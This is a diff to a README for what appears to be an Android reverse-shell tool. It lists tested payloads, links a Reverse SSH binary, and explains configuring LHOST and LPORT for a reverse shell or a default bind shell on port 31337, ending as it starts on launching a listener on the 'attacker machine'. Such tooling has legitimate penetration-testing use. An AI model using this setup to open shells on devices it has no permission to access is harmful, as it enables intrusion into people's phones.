@@ -12,7 +12,7 @@ Payloads tested:
 
 #### Logcat writer
 
-The stock payload that simply writes stuff to logcat:
+Stock payload that simply writes stuff to logcat:
 ```
 $ adb logcat | grep revshell
 03-18 00:34:46.884  3197  3197 D revshell: Start successfull!
@@ -39,10 +39,10 @@ However, even static build may have very limited functionality because of compat
 
 #### Reverse SSH
 
-This payload ([link]()) has better compatibility with Android and seems to work reliably, though it might be a bit tricky to use. 
+This payload ([link](https://github.com/Fahrj/reverse-ssh)) has better compatibility with Android and seems to work reliably, though it might be a bit tricky to use. 
 `upx_reverse-ssh-armv8-x64` version is recommended. 
 
-Set LHOST and LPORT in `config.prop`. 
+For reverse shell, set LHOST and LPORT in `config.prop`. Otherwise it will act as bind shell (default port: 31337).
 
 Launch _ReverseSSH_ listener on attacker machine:
 ```
